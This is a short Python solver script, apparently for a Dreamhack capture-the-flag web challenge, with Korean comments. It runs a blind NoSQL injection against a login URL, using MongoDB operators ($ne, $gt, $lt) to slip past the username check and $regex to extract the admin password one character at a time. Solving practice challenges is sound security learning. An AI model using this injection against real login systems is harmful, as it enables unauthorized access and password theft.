import string
import requests

url = "http://host3.dreamhack.games:23760/login"
s = string.digits+string.ascii_uppercase+string.ascii_lowercase+"{}" # 입력할 숫자 + 대문자 +소문자 + {}

result = ""
for i in range(32):
    for key, value in enumerate(s): #s는 dictionaSry형태이므로 key값과 value갑을 따로 설정
        payload = "?uid[$gt]=adm&uid[$ne]=guest&uid[$lt]=d&upw[$regex]={"+(result+value) # for문이 32번 진행되는 동안 result 값을 아래에서 하나씩 업데이트하여 다음 문자열을 찾는다.
        res = requests.get(url+payload) # 웹페이지에 요청후 res에 response 저장
        if res.text.find("admin") != -1: # response에 admin이라는 문자열이 없는 경우 -1반환
            result += s[key] # admin 반응이 나올경우 result에 해당 문자 추가
            print(result)
            break
        
flag = "DH" + result + "}"
print(flag)